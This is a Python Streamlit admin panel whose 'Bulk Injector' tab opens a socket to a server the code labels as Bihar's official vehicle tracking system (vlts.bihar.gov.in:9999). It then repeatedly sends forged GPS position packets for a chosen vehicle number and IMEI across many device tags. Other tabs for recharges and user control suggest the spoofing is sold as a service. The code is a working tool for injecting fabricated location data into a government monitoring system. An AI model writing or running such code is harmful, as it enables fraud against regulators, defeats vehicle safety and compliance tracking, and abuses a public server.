import streamlit as st
import pandas as pd
import time
import socket
from datetime import datetime, timedelta
from database import supabase, get_tags

# --- PERMANENT OFFICIAL SETTINGS ---
HOST_URL = "vlts.bihar.gov.in"
PORT = 9999

def admin_panel():
    st.sidebar.markdown("<h2 style='color: #FF4B4B;'>👑 Admin Pro Max</h2>", unsafe_allow_html=True)
    if st.sidebar.button("🔒 Logout Admin", use_container_width=True):
        st.session_state.logged_in = False
        st.rerun()
    
    t1, t2, t3, t4, t5 = st.tabs(["📊 Reports", "🚀 Bulk Injector", "🏷️ Tag Manager", "👤 User Control", "💳 Recharges"])
    
    # --- TAB 2: ULTRA FAST BULK INJECTOR ---
    with t2:
        st.subheader("⚡ Bihar VLTS Bulk Injector")
        st.info(f"📡 Sending to: {HOST_URL}:{PORT}")
        
        with st.container(border=True):
            c1, c2, c3 = st.columns(3)
            v_no = c1.text_input("Vehicle No", value="BR04GA5974").upper().strip()
            i_no = c2.text_input("IMEI No", value="862567075041793").strip()
            interval = c3.slider("Loop Delay (Seconds)", 1, 60, 1)
            
            lat_in = c1.number_input("Latitude", value=25.6501550, format="%.7f")
            lon_in = c2.number_input("Longitude", value=84.7851780, format="%.7f")

        # Database se saare tags load karna
        all_db_tags = get_tags()
        st.write(f"🚀 **{len(all_db_tags)} Tags** ready for simultaneous fire.")

        st.divider()
        col_btn, col_status = st.columns([1, 3])
        
        if 'injecting' not in st.session_state:
            st.session_state.injecting = False

        if not st.session_state.injecting:
            if col_btn.button("🔥 START BULK FIRE", use_container_width=True):
                # 1. Single DB Hit for Record
                supabase.table("activity_logs").insert({
                    "user_id": "ADMIN_MASTER", 
                    "vehicle_no": f"BURST_START: {v_no}"
                }).execute()
                st.session_state.injecting = True
                st.rerun()
        else:
            if col_btn.button("🛑 STOP", use_container_width=True):
                st.session_state.injecting = False
                st.rerun()
            
            status_box = col_status.empty()
            
            try:
                # Persistent Connection for Speed
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(3)
                    s.connect((HOST_URL, PORT))
                    
                    while st.session_state.injecting:
                        d_now = datetime.now().strftime("%d%m%Y")
                        t_now = datetime.now().strftime("%H%M%S")
                        
                        # Har tag ke liye packet bhej raha hai (High Speed)
                        for current_tag in all_db_tags:
                            packet = f"$PVT,{current_tag},2.1.1,NR,01,L,{i_no},{v_no},1,{d_now},{t_now},{lat_in:.7f},N,{lon_in:.7f},E,0.00,0.0,11,73,0.8,0.8,airtel,1,1,11.5,4.3,0,C,26,404,73,0a83,e3c8,e3c7,0a83,7,e3fb,0a83,7,c79d,0a83,10,e3f9,0a83,0,0001,00,000041,DDE3*\r\n"
                            s.sendall(packet.encode('utf-8'))
                        
                        status_box.success(f"🚀 All Tags Fired at {t_now}!")
                        time.sleep(interval)
                        
            except Exception as e:
                st.error(f"Server Connection Error: {e}")
                st.session_state.injecting = False

    # (Other tabs logic remains same as before)
